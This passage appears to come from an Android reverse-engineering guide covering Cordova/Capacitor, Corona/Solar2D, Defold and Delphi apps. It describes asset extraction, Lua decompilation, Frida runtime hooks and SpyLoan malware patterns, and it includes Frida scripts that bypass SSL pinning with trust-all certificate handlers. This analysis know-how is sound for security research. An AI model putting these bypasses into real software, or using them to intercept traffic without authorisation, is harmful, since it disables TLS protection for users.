aligned.apk\napksigner sign --ks debug.keystore aligned.apk\n</code></pre> <p>This is the most direct patching path of any Android framework -- the source code is shipped as-is.</p>"},{"location":"reversing/frameworks/cordova/#ssl-pinning","title":"SSL Pinning","text":"<p>SSL pinning in Cordova/Capacitor apps operates at the Java layer, typically through one of these mechanisms:</p>"},{"location":"reversing/frameworks/cordova/#okhttp-plugin-pinning","title":"OkHttp Plugin Pinning","text":"<p>Many Cordova apps use <code>cordova-plugin-advanced-http</code> which wraps OkHttp. Pinning is configured in Java:</p> <pre><code>Java.perform(function() {\n    var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertPinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(host, certs) {\n        console.log(\"[SSL] Bypassed pin for: \" + host);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cordova/#webviewclient-certificate-override","title":"WebViewClient Certificate Override","text":"<p>Some apps implement pinning by overriding <code>WebViewClient.onReceivedSslError</code>:</p> <pre><code>Java.perform(function() {\n    var WebViewClient = Java.use(\"android.webkit.WebViewClient\");\n    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {\n        handler.proceed();\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/cordova/#js-layer-pinning","title":"JS-Layer Pinning","text":"<p>Rare, but some apps implement certificate checks in JavaScript using <code>cordova-plugin-advanced-http</code>'s pinning API. For these, patch the JS directly -- locate the <code>setSSLCertMode</code> call and change the mode from <code>pinned</code> to <code>nocheck</code>, or remove the pinning configuration entirely from the web assets.</p>"},{"location":"reversing/frameworks/cordova/#obfuscation","title":"Obfuscation","text":""},{"location":"reversing/frameworks/cordova/#javascript-minification","title":"JavaScript Minification","text":"<p>Most Cordova/Ionic apps ship with minified but not obfuscated JavaScript. The build toolchain (webpack, esbuild, Vite) produces minified bundles that are trivially beautifiable:</p> <pre><code>npx prettier --write extracted/assets/www/js/app.js\n</code></pre> <p>Variable names are shortened but string literals, API endpoints, and logic flow remain intact.</p>"},{"location":"reversing/frameworks/cordova/#webpack-source-maps","title":"Webpack Source Maps","text":"<p>Development builds sometimes ship with source maps (<code>.map</code> files) that fully reconstruct the original TypeScript/JavaScript with original variable names and file structure:</p> <pre><code>find extracted/assets/ -name \"*.map\"\n</code></pre> <p>If present, source maps eliminate any reversing effort entirely.</p>"},{"location":"reversing/frameworks/cordova/#ionic-appflow-obfuscation","title":"Ionic AppFlow Obfuscation","text":"<p>Ionic's commercial platform (AppFlow) offers optional JavaScript obfuscation as a build step. This applies javascript-obfuscator transformations:</p> <ul> <li>String encoding via helper functions</li> <li>Control flow flattening</li> <li>Dead code injection</li> <li>Identifier mangling beyond standard minification</li> </ul> <p>The obfuscation is JavaScript-level only. Standard deobfuscation techniques apply -- community tools like webcrack and manual AST analysis work against these transforms.</p>"},{"location":"reversing/frameworks/cordova/#proguard-r8","title":"ProGuard / R8","text":"<p>The Java plugin layer runs through R8/ProGuard in release builds, renaming Java classes and methods. This affects only the native plugin code in DEX, not the JavaScript assets.</p>"},{"location":"reversing/frameworks/cordova/#malware-context","title":"Malware Context","text":"<p>Cordova and Ionic are the most common frameworks in SpyLoan predatory lending campaigns. The WebView architecture enables rapid cloning of legitimate financial app UIs using standard web development skills, without any Android-specific expertise.</p> Use Case Details SpyLoan predatory lending Majority of SpyLoan apps use Cordova/Ionic for rapid deployment of loan application UIs that harvest contacts, photos, SMS, and location data Credential phishing WebView-based apps displaying fake login forms for banking or government services, POSTing credentials to C2 servers Data harvesting Cordova plugin ecosystem provides ready-made access to contacts, SMS, camera, and storage via simple JS calls Phishing campaigns Quick production of convincing app replicas from a single HTML/CSS/JS codebase"},{"location":"reversing/frameworks/cordova/#spyloan-pattern","title":"SpyLoan Pattern","text":"<p>The typical SpyLoan Cordova app follows a consistent pattern:</p> <ol> <li>Legitimate-looking loan application UI built with Ionic components</li> <li><code>cordova-plugin-contacts</code> harvests the full contact list during \"reference verification\"</li> <li><code>cordova-plugin-camera</code> captures selfies and ID documents during \"KYC verification\"</li> <li><code>cordova-plugin-geolocation</code> tracks location during \"credit assessment\"</li> <li>Custom plugins or <code>cordova-plugin-file</code> stage and exfiltrate data to remote servers</li> <li>Collected data is later used to harass and extort borrowers who default</li> </ol> <p>The JavaScript source is fully readable, making it straightforward to document the data flow from UI forms through plugin calls to C2 exfiltration endpoints.</p> <p>Framework Prevalence in SpyLoan</p> <p>McAfee's 2024 SpyLoan analysis and ESET's research on predatory fintech apps consistently identify Cordova/Ionic as the dominant framework in this threat category. The low development barrier and cross-platform deployment make it the preferred tool for operators mass-producing lending apps across Latin America, Southeast Asia, and Africa.</p>"},{"location":"reversing/frameworks/cordova/#capacitor-specific-analysis","title":"Capacitor-Specific Analysis","text":""},{"location":"reversing/frameworks/cordova/#asset-location","title":"Asset Location","text":"<p>Capacitor apps store web assets in <code>assets/public/</code> instead of <code>assets/www/</code>:</p> <pre><code>ls extracted/assets/public/\n</code></pre>"},{"location":"reversing/frameworks/cordova/#bridge-architecture","title":"Bridge Architecture","text":"<p>Capacitor's bridge is more structured than Cordova's. The <code>com.getcapacitor.Bridge</code> class maintains a typed plugin registry. Each plugin is a Java class extending <code>com.getcapacitor.Plugin</code> with methods annotated <code>@PluginMethod</code>:</p> <pre><code>jadx -d out/ target.apk\ngrep -r \"@PluginMethod\" out/ --include=\"*.java\"\n</code></pre> <p>This lists every native method callable from JavaScript, providing a direct map of the app's native attack surface.</p>"},{"location":"reversing/frameworks/cordova/#capacitor-plugins","title":"Capacitor Plugins","text":"<p>Capacitor uses a different plugin namespace. Common plugins to examine:</p> Plugin Package Camera <code>@capacitor/camera</code> Filesystem <code>@capacitor/filesystem</code> Geolocation <code>@capacitor/geolocation</code> Device <code>@capacitor/device</code> HTTP <code>@capacitor/http</code> (bypasses CORS) Preferences <code>@capacitor/preferences</code> (local key-value storage) <p>The <code>@capacitor/http</code> plugin is notable -- it makes HTTP requests from the native layer rather than the WebView, bypassing CORS restrictions and making network interception via WebView hooks insufficient. Use OkHttp/HttpURLConnection hooks instead to capture this traffic.</p>"},{"location":"reversing/frameworks/cordova/#live-reload-detection","title":"Live Reload Detection","text":"<p>Capacitor supports live reload during development, where the WebView connects to a remote dev server instead of loading local assets. Some apps accidentally ship with this enabled:</p> <pre><code>cat extracted/assets/capacitor.config.json | grep -i \"server\"\n</code></pre> <p>A <code>server.url</code> field pointing to an IP address or <code>localhost</code> indicates a misconfigured build that loads code from a remote source -- a potential hijack vector if the address is attacker-reachable.</p>"},{"location":"reversing/frameworks/cordova/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Cordova Capacitor Code format Plaintext JS/HTML/CSS Plaintext JS/HTML/CSS Readability High -- standard web source High -- standard web source String extraction Trivial Trivial Control flow recovery Full Full Patching Edit JS files directly Edit JS files directly Obfuscation ceiling JS obfuscation tools, Ionic AppFlow JS obfuscation tools Overall difficulty Very Easy Very Easy <p>Cordova-family apps are the simplest Android apps to reverse engineer. The source code ships as plaintext web assets. No decompilation, disassembly, or bytecode analysis is needed -- the app is its own source code. The only complicating factor is JavaScript obfuscation, which is uncommon in this ecosystem and weaker than native-level protections. Focus analysis on the web assets directory and <code>cordova_plugins.js</code> manifest.</p>"},{"location":"reversing/frameworks/cordova/#references","title":"References","text":"<ul> <li>Apache Cordova Documentation</li> <li>Capacitor Documentation</li> <li>Ionic Framework</li> <li>jadx -- Android DEX Decompiler</li> <li>Frida</li> <li>McAfee SpyLoan Research</li> <li>ESET Predatory Fintech Research</li> <li>OWASP Mobile Application Security Testing Guide</li> <li>WebView Exploitation</li> </ul>"},{"location":"reversing/frameworks/corona/","title":"Corona SDK / Solar2D","text":"<p>Corona SDK (rebranded as Solar2D in 2020) builds Android apps using Lua as the scripting language, with a C/C++ runtime handling rendering, physics, and platform APIs. Application Lua code is compiled to Lua bytecode and packed into a <code>resource.car</code> archive inside the APK's <code>assets/</code> directory. The runtime executes this bytecode through an embedded Lua VM (<code>liblua.so</code>) managed by the Corona native engine (<code>libcorona.so</code>). Solar2D is open-source and primarily used for 2D games, though some utility apps and malware samples have used the framework for rapid cross-platform deployment.</p>"},{"location":"reversing/frameworks/corona/#architecture","title":"Architecture","text":"Component Role Lua VM Executes Lua bytecode via embedded <code>liblua.so</code> (Lua 5.1 based) Corona Runtime C++ engine managing app lifecycle, rendering, and native API bridging resource.car Corona Archive containing compiled Lua bytecode files Corona Plugins Native libraries providing extended functionality (ads, analytics, IAP) <p>Execution flow: Android activity launches via <code>com.ansca.corona.CoronaActivity</code>, <code>libcorona.so</code> initializes the runtime and Lua VM, the runtime loads Lua bytecode from <code>resource.car</code>, and <code>main.lua</code> (compiled) executes as the entry point. All application logic runs through Lua calling Corona APIs for rendering, networking, and platform access.</p> Library Purpose <code>libcorona.so</code> Corona runtime engine <code>liblua.so</code> Lua 5.1 virtual machine <code>libalmixer.so</code> Audio mixing library <code>libmpg123.so</code> MP3 decoding <code>libopenal.so</code> OpenAL audio backend"},{"location":"reversing/frameworks/corona/#identification","title":"Identification","text":"Indicator Location <code>libcorona.so</code> <code>lib/&lt;arch&gt;/</code> directory <code>liblua.so</code> <code>lib/&lt;arch&gt;/</code> directory <code>assets/resource.car</code> Corona archive with compiled Lua files <code>com.ansca.corona.*</code> Package prefix in DEX classes <code>com.ansca.corona.CoronaActivity</code> Main activity class <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(libcorona|liblua|resource\\.car|corona)\"\n</code></pre>"},{"location":"reversing/frameworks/corona/#code-location-extraction","title":"Code Location &amp; Extraction","text":""},{"location":"reversing/frameworks/corona/#resourcecar-format","title":"resource.car Format","text":"<p>The <code>resource.car</code> file is a Corona-specific archive containing compiled Lua bytecode files. It uses a custom header and file table, not a standard archive format.</p> <pre><code>unzip target.apk assets/resource.car -d extracted/\n</code></pre>"},{"location":"reversing/frameworks/corona/#unpacking-resourcecar","title":"Unpacking resource.car","text":"<p>Use the Car Unpacker tool:</p> <pre><code>python3 car_unpacker.py extracted/assets/resource.car -o lua_output/\n</code></pre> <p>If no unpacker is available, examine the binary structure:</p> <pre><code>xxd -l 64 extracted/assets/resource.car\nstrings extracted/assets/resource.car | grep \"\\.lu\"\n</code></pre> <p>The archive contains files with <code>.lu</code> extensions -- compiled Lua bytecode, not Lua source.</p>"},{"location":"reversing/frameworks/corona/#identifying-lua-bytecode","title":"Identifying Lua Bytecode","text":"<p>Lua 5.1 bytecode files start with a distinctive header:</p> Offset Value Meaning 0x00 <code>\\x1bLua</code> Lua bytecode signature 0x04 <code>0x51</code> Lua version 5.1 0x05 <code>0x00</code> Format version (official) <pre><code>xxd -l 8 lua_output/main.lu\n</code></pre>"},{"location":"reversing/frameworks/corona/#lua-decompilation","title":"Lua Decompilation","text":"<p>unluac is the primary decompiler for Lua 5.1 bytecode:</p> <pre><code>java -jar unluac.jar lua_output/main.lu &gt; main.lua\n</code></pre> <p>Batch decompilation:</p> <pre><code>for f in lua_output/*.lu; do\n    java -jar unluac.jar \"$f\" &gt; \"${f%.lu}.lua\" 2&gt;/dev/null\ndone\n</code></pre> <p>luadec is an alternative that handles some constructs unluac struggles with:</p> <pre><code>./luadec lua_output/main.lu &gt; main.lua\n</code></pre> Tool Strengths Weaknesses unluac Best overall Lua 5.1 support Struggles with heavily obfuscated bytecode luadec Handles some edge cases better Less maintained, harder to build"},{"location":"reversing/frameworks/corona/#analysis-of-decompiled-code","title":"Analysis of Decompiled Code","text":"<pre><code>grep -rn \"network\\.request\\|socket\\|http\" decompiled/\ngrep -rn \"crypto\\|encrypt\\|decrypt\\|key\\|password\" decompiled/\n</code></pre> <p>Key Corona API patterns:</p> Pattern Significance <code>network.request()</code> HTTP requests -- extract endpoints and parameters <code>network.download()</code> File downloads from remote servers <code>system.getInfo()</code> Device fingerprinting <code>native.showAlert()</code> UI dialogs -- phishing lure text <code>store.purchase()</code> In-app purchase manipulation <code>crypto.digest()</code> Cryptographic operations <code>io.open()</code> Local file access"},{"location":"reversing/frameworks/corona/#encryption","title":"Encryption","text":"<p>Some Corona/Solar2D apps encrypt their Lua bytecode before packing into <code>resource.car</code>. Indicators:</p> <ul> <li>Extracted <code>.lu</code> files do not start with <code>\\x1bLua</code> header</li> <li>Files appear as random bytes with high entropy</li> <li>Decompilers fail with format errors</li> </ul> <p>The decryption routine resides in <code>libcorona.so</code> since the runtime must decrypt bytecode before passing it to the Lua VM. The most reliable extraction method is intercepting <code>luaL_loadbuffer</code> to capture bytecode after decryption:</p> <pre><code>var luaModule = Process.findModuleByName(\"liblua.so\");\nif (luaModule) {\n    var luaL_loadbuffer = luaModule.findExportByName(\"luaL_loadbuffer\");\n    if (luaL_loadbuffer) {\n        Interceptor.attach(luaL_loadbuffer, {\n            onEnter: function(args) {\n                var buf = args[1];\n                var size = args[2].toInt32();\n                var name = args[3].readCString();\n                console.log(\"[Lua] Loading: \" + name + \" (\" + size + \" bytes)\");\n                var outPath = \"/data/local/tmp/lua_dump/\" + name.replace(/\\//g, \"_\");\n                var f = new File(outPath, \"wb\");\n                f.write(buf.readByteArray(size));\n                f.close();\n            }\n        });\n    }\n}\n</code></pre> <p>This captures every Lua chunk after decryption, producing clean bytecode files that can be decompiled with unluac.</p> <p>To locate decryption symbols statically:</p> <pre><code>var coronaModule = Process.findModuleByName(\"libcorona.so\");\nif (coronaModule) {\n    coronaModule.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"decrypt\") !== -1 || exp.name.indexOf(\"Decrypt\") !== -1) {\n            console.log(\"[Corona] \" + exp.name + \" @ \" + exp.address);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/corona/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/corona/#lua-vm-interception","title":"Lua VM Interception","text":"<p>The primary hooking point is <code>luaL_loadbuffer</code> in <code>liblua.so</code>, which receives all Lua code before execution:</p> <pre><code>var luaModule = Process.findModuleByName(\"liblua.so\");\nvar luaL_loadbuffer = luaModule.findExportByName(\"luaL_loadbuffer\");\n\nInterceptor.attach(luaL_loadbuffer, {\n    onEnter: function(args) {\n        this.name = args[3].readCString();\n        this.size = args[2].toInt32();\n        console.log(\"[Lua] Load: \" + this.name + \" size=\" + this.size);\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/corona/#lua-function-call-monitoring","title":"Lua Function Call Monitoring","text":"<p>Hook <code>lua_pcall</code> to trace function execution:</p> <pre><code>var lua_pcall = luaModule.findExportByName(\"lua_pcall\");\n\nInterceptor.attach(lua_pcall, {\n    onEnter: function(args) {\n        var nargs = args[1].toInt32();\n        var nresults = args[2].toInt32();\n        console.log(\"[Lua] pcall nargs=\" + nargs + \" nresults=\" + nresults);\n    },\n    onLeave: function(retval) {\n        if (retval.toInt32() !== 0) {\n            console.log(\"[Lua] pcall error code: \" + retval.toInt32());\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/corona/#java-layer-corona-hooks","title":"Java-Layer Corona Hooks","text":"<pre><code>Java.perform(function() {\n    var CoronaActivity = Java.use(\"com.ansca.corona.CoronaActivity\");\n    CoronaActivity.onCreate.implementation = function(bundle) {\n        console.log(\"[Corona] Activity created\");\n        this.onCreate(bundle);\n    };\n\n    var CoronaRuntimeTaskDispatcher = Java.use(\"com.ansca.corona.CoronaRuntimeTaskDispatcher\");\n    CoronaRuntimeTaskDispatcher.send.implementation = function(task) {\n        console.log(\"[Corona] Runtime task: \" + task.getClass().getName());\n        this.send(task);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/corona/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Corona's networking uses Java's HTTP stack under the hood. Standard Android SSL bypass techniques apply:</p> <pre><code>Java.perform(function() {\n    var SSLContext = Java.use(\"javax.net.ssl.SSLContext\");\n    var X509TrustManager = Java.use(\"javax.net.ssl.X509TrustManager\");\n\n    var TrustAll = Java.registerClass({\n        name: \"com.bypass.TrustAll\",\n        implements: [X509TrustManager],\n        methods: {\n            checkClientTrusted: function(chain, authType) {},\n            checkServerTrusted: function(chain, authType) {},\n            getAcceptedIssuers: function() { return []; }\n        }\n    });\n\n    var managers = Java.array(\"javax.net.ssl.TrustManager\", [TrustAll.$new()]);\n    var ctx = SSLContext.getInstance(\"TLS\");\n    ctx.init(null, managers, null);\n    SSLContext.setDefault(ctx);\n});\n</code></pre> <p>If pinning is implemented in Lua code via <code>network.request</code> parameters, patch the decompiled Lua source, recompile with <code>luac</code>, repack into <code>resource.car</code>, and rebuild the APK.</p>"},{"location":"reversing/frameworks/corona/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Standard Build Encrypted Lua Code format Lua 5.1 bytecode in resource.car Encrypted bytecode in resource.car Readability High after decompilation with unluac Requires runtime dump first String extraction Trivial from bytecode Requires decryption Decompiler quality Good -- unluac handles most constructs Same after decryption Patching Decompile, edit, recompile with luac Must also handle re-encryption or bypass Overall difficulty Easy Moderate <p>Corona/Solar2D apps with standard (unencrypted) Lua bytecode are straightforward targets. The <code>resource.car</code> unpacking adds one extra step compared to frameworks that store scripts as loose files, but mature tooling handles this well. Encrypted builds require runtime interception via <code>luaL_loadbuffer</code> hooking to dump decrypted bytecode before decompilation can proceed.</p>"},{"location":"reversing/frameworks/corona/#references","title":"References","text":"<ul> <li>Solar2D Open Source Engine</li> <li>unluac -- Lua Decompiler</li> <li>luadec -- Lua Decompiler</li> <li>Corona CAR Unpacker</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>Lua 5.1 Bytecode Reference</li> </ul>"},{"location":"reversing/frameworks/defold/","title":"Defold","text":"<p>Defold is an open-source game engine developed by the Defold Foundation (originally King, now independent). It uses Lua as its scripting language with a native C++ engine core compiled into <code>libdmengine.so</code>. Game assets and Lua scripts are bundled into a proprietary archive format (<code>.arcd</code> / <code>.arci</code>) rather than shipped as loose files, making extraction a required first step. Defold targets 2D games primarily and has a smaller market share than Unity or Godot, but its archive-based asset packaging creates a distinct reverse engineering workflow.</p>"},{"location":"reversing/frameworks/defold/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/defold/#engine-structure","title":"Engine Structure","text":"Layer Implementation Engine core C++ compiled to <code>libdmengine.so</code> (per-ABI native library) Scripting Lua 5.1 (LuaJIT on some platforms, standard Lua VM on Android) Rendering OpenGL ES / Vulkan via engine abstractions Physics Box2D (2D) / Bullet (3D) integrated in engine Asset system Proprietary archive format (<code>.arcd</code> data + <code>.arci</code> index) <p>All game logic is written in Lua scripts that the engine executes via its embedded Lua VM. The C++ engine handles rendering, physics, input, sound, and platform integration. Lua scripts define game object behaviors, UI logic, and scene transitions through Defold's component model.</p>"},{"location":"reversing/frameworks/defold/#game-object-model","title":"Game Object Model","text":"<p>Defold organizes games around collections (scenes), game objects (entities), and scripts (<code>.script</code> for game logic, <code>.gui_script</code> for UI logic). At build time, all files are compiled into binary representations and packed into the archive. Lua scripts are compiled to Lua bytecode (not shipped as plaintext).</p>"},{"location":"reversing/frameworks/defold/#identification","title":"Identification","text":"Indicator Location <code>libdmengine.so</code> Defold engine native library (definitive) <code>assets/game.arcd</code> Game data archive (compiled assets + scripts) <code>assets/game.arci</code> Archive index file <code>assets/game.dmanifest</code> Defold manifest -- project settings, dependencies <code>assets/game.projectc</code> Compiled project settings <code>assets/game.public.der</code> Archive signature public key <code>com.defold.*</code> Engine Java classes in DEX <code>com.dynamo.bob.*</code> Build tool remnants occasionally present <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(libdmengine|game\\.arcd|game\\.dmanifest)\"\n</code></pre> <p>The presence of both <code>libdmengine.so</code> and <code>game.arcd</code> confirms a Defold application. The <code>.dmanifest</code> file contains project metadata in a Protocol Buffers format.</p>"},{"location":"reversing/frameworks/defold/#code-location","title":"Code Location","text":"<p>Game logic resides in Lua scripts compiled to Lua 5.1 bytecode and packed inside <code>assets/game.arcd</code>. The archive also contains all other game assets (textures, sounds, tilemaps, collections, GUI definitions). The native engine library <code>libdmengine.so</code> contains no game-specific logic -- it is the same engine binary across all Defold games, only differing by engine version.</p> <p>The DEX layer contains only thin Android lifecycle glue code (<code>com.defold.engine.GameActivity</code>, etc.) with no game logic.</p>"},{"location":"reversing/frameworks/defold/#archive-extraction","title":"Archive Extraction","text":""},{"location":"reversing/frameworks/defold/#defold-archive-format","title":"Defold Archive Format","text":"<p>The Defold archive consists of two files:</p> File Purpose <code>game.arci</code> Index -- maps file paths (hashed) to offsets and sizes within the data file <code>game.arcd</code> Data -- concatenated binary blobs of all compiled assets <p>The index stores entries as path hashes (DJB2 or similar) with offset, size, and compression metadata. Assets may be LZ4-compressed within the archive.</p>"},{"location":"reversing/frameworks/defold/#extraction-tools","title":"Extraction Tools","text":"<p>defold-unpacker parses the <code>.arci</code> index and extracts files from <code>.arcd</code>:</p> <pre><code>python defold-unpacker.py --index assets/game.arci --data assets/game.arcd --output extracted/\n</code></pre> <p>For custom extraction, the Defold engine source is open (GitHub). The archive format is defined in <code>engine/resource/src/resource_archive.h</code>.</p>"},{"location":"reversing/frameworks/defold/#extracted-file-types","title":"Extracted File Types","text":"<p>Extraction produces compiled binary versions of all game files. The primary RE targets are <code>.scriptc</code> (game object scripts) and <code>.gui_scriptc</code> (GUI scripts), both containing Lua 5.1 bytecode. Other files include <code>.collectionc</code> (scene data, Protocol Buffers), <code>.goc</code> (game objects), <code>.atlasc</code>/<code>.texturec</code> (texture data), and <code>.soundc</code> (audio metadata).</p>"},{"location":"reversing/frameworks/defold/#lua-decompilation","title":"Lua Decompilation","text":""},{"location":"reversing/frameworks/defold/#lua-bytecode-format","title":"Lua Bytecode Format","text":"<p>Defold compiles Lua scripts to standard Lua 5.1 bytecode. Each <code>.scriptc</code> file starts with the Lua bytecode header:</p> Offset Size Field 0x00 4 bytes Signature: <code>\\x1bLua</code> 0x04 1 byte Version: <code>0x51</code> (Lua 5.1) 0x05 1 byte Format version 0x06 1 byte Endianness <p>Verify with:</p> <pre><code>xxd -l 8 extracted/logic/main.scriptc\n</code></pre>"},{"location":"reversing/frameworks/defold/#decompilation-tools","title":"Decompilation Tools","text":"Tool Purpose unluac Java-based Lua decompiler, best results for Lua 5.1 luadec C-based Lua 5.1 decompiler luajit-decompiler For LuaJIT bytecode (if applicable) unluacluadec <pre><code>java -jar unluac.jar extracted/logic/main.scriptc &gt; main.lua\n</code></pre> <pre><code>luadec extracted/logic/main.scriptc &gt; main.lua\n</code></pre>"},{"location":"reversing/frameworks/defold/#decompiled-output","title":"Decompiled Output","text":"<p>Lua 5.1 bytecode retains local variable names, string literals, function structure, and upvalue names unless explicitly stripped. Defold's build pipeline does not strip debug info by default, producing near-source-level decompilation output. Decompiled scripts follow the engine's lifecycle API:</p> <pre><code>function init(self)\n    self.speed = 200\n    self.health = 100\n    msg.post(\".\", \"acquire_input_focus\")\nend\n\nfunction update(self, dt)\n    local pos = go.get_position()\n    pos.x = pos.x + self.speed * dt\n    go.set_position(pos)\nend\n\nfunction on_message(self, message_id, message, sender)\n    if message_id == hash(\"damage\") then\n        self.health = self.health - message.amount\n    end\nend\n\nfunction on_input(self, action_id, action)\n    if action_id == hash(\"touch\") and action.pressed then\n        msg.post(\"/game/spawner\", \"spawn_enemy\")\n    end\nend\n</code></pre> <p>Key Defold API functions to trace:</p> Function Purpose <code>msg.post()</code> Inter-object messaging (primary communication mechanism) <code>go.get_position()</code> / <code>go.set_position()</code> Game object transforms <code>http.request()</code> Network requests (C2 communication vector) <code>sys.save()</code> / <code>sys.load()</code> Persistent storage <code>sys.open_url()</code> Open external URLs <code>iap.buy()</code> In-app purchase triggers"},{"location":"reversing/frameworks/defold/#hooking","title":"Hooking","text":""},{"location":"reversing/frameworks/defold/#dump-lua-scripts-at-runtime","title":"Dump Lua Scripts at Runtime","text":"<p>Hook <code>luaL_loadbuffer</code> in <code>libdmengine.so</code> to capture every Lua script as the engine loads it, bypassing archive extraction entirely:</p> <pre><code>var dmengine = Process.findModuleByName(\"libdmengine.so\");\nif (dmengine) {\n    var loadbuffer = dmengine.enumerateExports().filter(function(e) {\n        return e.name.indexOf(\"luaL_loadbuffer\") !== -1;\n    });\n    if (loadbuffer.length &gt; 0) {\n        Interceptor.attach(loadbuffer[0].address, {\n            onEnter: function(args) {\n                var buf = args[1];\n                var size = args[2].toInt32();\n                var name = args[3].readCString();\n                console.log(\"[Lua] Loading: \" + name + \" (\" + size + \" bytes)\");\n                var outPath = \"/data/local/tmp/defold_scripts/\" + name.replace(/\\//g, \"_\");\n                var f = new File(outPath, \"wb\");\n                f.write(buf.readByteArray(size));\n                f.close();\n                console.log(\"[Lua] Dumped to: \" + outPath);\n            }\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/defold/#intercept-http-requests","title":"Intercept HTTP Requests","text":"<pre><code>var dmengine = Process.findModuleByName(\"libdmengine.so\");\nif (dmengine) {\n    dmengine.enumerateExports().forEach(function(exp) {\n        if (exp.name.indexOf(\"HttpRequest\") !== -1 || exp.name.indexOf(\"http_request\") !== -1) {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log(\"[HTTP] Request intercepted\");\n                }\n            });\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/defold/#lua-vm-state-intercepts","title":"Lua VM State Intercepts","text":"<p>Hook <code>lua_pcall</code> to trace all Lua function execution at the VM level. Similarly, hook <code>lua_tostring</code>, <code>lua_tonumber</code>, and <code>lua_pushstring</code> to observe data flowing through the Lua stack. All these symbols are exported from <code>libdmengine.so</code> and can be resolved with <code>Module.findExportByName()</code>.</p>"},{"location":"reversing/frameworks/defold/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Unzip APK and confirm Defold (<code>libdmengine.so</code> + <code>game.arcd</code>)</li> <li>Extract archive using defold-unpacker or manual tools</li> <li>Identify script files (<code>.scriptc</code>, <code>.gui_scriptc</code>)</li> <li>Decompile Lua bytecode with unluac or luadec</li> <li>Trace <code>http.request()</code> calls for network communication</li> <li>Trace <code>msg.post()</code> calls to understand inter-object messaging flow</li> <li>Review collection files to understand scene structure</li> <li>Hook at runtime with Frida on <code>libdmengine.so</code> for dynamic analysis</li> </ol>"},{"location":"reversing/frameworks/defold/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Lua 5.1 bytecode in proprietary archive Readability High after extraction and decompilation (variable names often preserved) String extraction Requires archive extraction first, then trivial Control flow recovery Full -- Lua 5.1 decompilation is mature Patching Replace <code>.scriptc</code> in archive or hook at runtime Obfuscation ceiling Low -- no built-in obfuscation tooling Overall difficulty Moderate <p>The primary barrier is the archive extraction step. Once scripts are extracted and decompiled, analysis is straightforward -- Lua 5.1 decompilation is a solved problem with mature tooling. The Defold engine being open-source further assists reverse engineering, as all engine APIs and internal data formats are documented in the source code.</p>"},{"location":"reversing/frameworks/defold/#references","title":"References","text":"<ul> <li>Defold -- Official Site</li> <li>Defold Engine -- GitHub</li> <li>unluac -- Lua Decompiler</li> <li>luadec -- Lua 5.1 Decompiler</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>Ghidra -- NSA Reverse Engineering Framework</li> </ul>"},{"location":"reversing/frameworks/delphi/","title":"Delphi / RAD Studio","text":"<p>Delphi for Android (Embarcadero RAD Studio) compiles Object Pascal to native ARM code via an LLVM-based backend. The UI framework is FireMonkey (FMX), which renders its own cross-platform widgets rather than using Android's native view system. The resulting APK contains a thin Java shell that bootstraps a single large native <code>.so</code> library holding the entire application -- UI, business logic, and runtime support. Delphi Android apps are relatively uncommon on Google Play but appear in enterprise tooling, legacy business apps, and occasionally in malware samples targeting specific regions.</p>"},{"location":"reversing/frameworks/delphi/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/delphi/#compilation-pipeline","title":"Compilation Pipeline","text":"Stage Description Source Object Pascal (<code>.pas</code>, <code>.dpr</code>) with optional inline assembly Compiler <code>dccaarm64</code> (ARM64) or <code>dccaarm</code> (ARM32) -- Delphi's LLVM-based compiler Output Native ARM shared library (<code>libFMXNativeActivity.so</code> or custom name) Runtime Delphi RTL (runtime library) statically linked into the <code>.so</code> UI FireMonkey (FMX) renders via OpenGL ES / Skia -- no Android native widgets"},{"location":"reversing/frameworks/delphi/#runtime-model","title":"Runtime Model","text":"Layer Components Java shell <code>FMXNativeActivity</code> (extends <code>NativeActivity</code>), <code>com.embarcadero.firemonkey.*</code> classes Native library Single <code>.so</code> containing application code, Delphi RTL, FireMonkey framework Rendering FireMonkey draws to a <code>SurfaceView</code> via OpenGL ES or Skia backend Networking Indy (<code>TIdHTTP</code>, <code>TIdTCPClient</code>) or <code>TNetHTTPClient</code> compiled into the native binary <p>The Java layer is minimal. <code>FMXNativeActivity</code> uses Android's <code>NativeActivity</code> mechanism to immediately hand control to the native <code>.so</code>, which initializes the Delphi RTL and FireMonkey renderer. Almost all logic -- including UI event handling, networking, and data storage -- runs in native code.</p>"},{"location":"reversing/frameworks/delphi/#firemonkey-ui","title":"FireMonkey UI","text":"<p>FireMonkey does not use Android's <code>View</code> hierarchy. It paints everything to a GPU surface, meaning:</p> <ul> <li>Android Layout Inspector and <code>uiautomator</code> show a single opaque surface</li> <li>Accessibility services see minimal widget tree</li> <li>UI automation tools cannot interact with individual FMX controls</li> </ul>"},{"location":"reversing/frameworks/delphi/#identification","title":"Identification","text":"Indicator Location <code>libFMXNativeActivity.so</code> <code>lib/&lt;arch&gt;/</code> -- default name for Delphi Android apps <code>com.embarcadero.firemonkey.*</code> DEX classes in the Java shell <code>com.embarcadero.rtl.*</code> DEX helper classes for RTL integration <code>FMXNativeActivity</code> Main activity in <code>AndroidManifest.xml</code> Large single <code>.so</code> (10-50+ MB) <code>lib/&lt;arch&gt;/</code> -- contains entire app + RTL + FMX 